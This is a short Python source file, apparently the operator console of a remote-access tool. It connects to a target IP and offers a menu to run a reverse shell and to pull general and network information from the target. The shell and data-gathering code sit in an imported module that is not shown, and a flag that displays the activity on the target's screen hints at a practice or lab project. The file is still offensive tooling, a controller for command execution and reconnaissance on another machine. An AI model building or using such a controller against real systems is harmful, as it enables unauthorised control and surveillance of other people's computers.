from ObjetClientTarget import Client
import argparse

parser = argparse.ArgumentParser()
parser.add_argument("-p", "--print_target", action="store_true", help="Show on Target's screen what are doing")
parser.add_argument("-i", "--ip_target", default="127.0.0.1", type=str,
                    help="define de target's ip, Default is 127.0.0.1 (localhost)")
args = parser.parse_args()


def menu():
    while True:
        print("\t \t ============ \n \t \t \t MENU\n \t \t ============")
        print("welcome, what's your choice?")
        print("1. Reverse Shell \n"
              "2. Get info \n"
              "3. Quit \n")
        choice = input("> ")

        if choice == "1":
            client.reverse_shell_send_command()
        if choice == "2":
            menu_getinfo()
        if choice == "3":
            break


def menu_getinfo():
    print("\t \t ============ \n \t \t \t MENU -- Get Info\n \t \t ============")
    print("1. Global information")
    print("2. Network information")
    print("3. Quit")
    choice = input("> ")

    if choice == "1":
        info = "getinfo_generality"
        client.getinfo(info)
    if choice == "2":
        client.getinfo("getinfo_network")


client = Client(args.ip_target)
client.connect_to_server()
if args.print_target:
    client.print_target()
menu()
client.quit()
